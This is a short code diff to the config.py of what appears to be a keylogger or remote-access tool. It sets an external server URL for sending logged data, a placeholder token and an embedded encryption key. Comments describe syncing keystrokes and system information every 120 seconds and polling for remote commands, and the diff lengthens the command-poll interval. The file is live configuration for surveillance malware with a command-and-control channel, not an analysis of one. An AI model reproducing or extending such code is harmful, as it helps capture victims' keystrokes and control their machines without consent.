@@ -1,3 +1,4 @@
+# ------------ config.py ------------
 import base64
 import os
 import platform
@@ -7,9 +8,9 @@ class Config:
     # Connection Settings
     SERVER_URL = "https://fasitheme.ir/logger/api.php"
     SECRET_TOKEN = "1"
-    CHECK_INTERVAL = 120  # seconds
-    COMMAND_POLL_INTERVAL = 10  # seconds
-    COMMAND_TIMEOUT = 10  # seconds, added for HTTP request timeout
+    CHECK_INTERVAL = 120  # seconds (data sync, e.g., keystrokes, system info)
+    COMMAND_POLL_INTERVAL = 60  # Increased from 10 to 60 seconds
+    COMMAND_TIMEOUT = 10  # seconds, for HTTP request timeout
     
     # Security Settings
     ENCRYPTION_KEY = base64.b64decode("nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=")
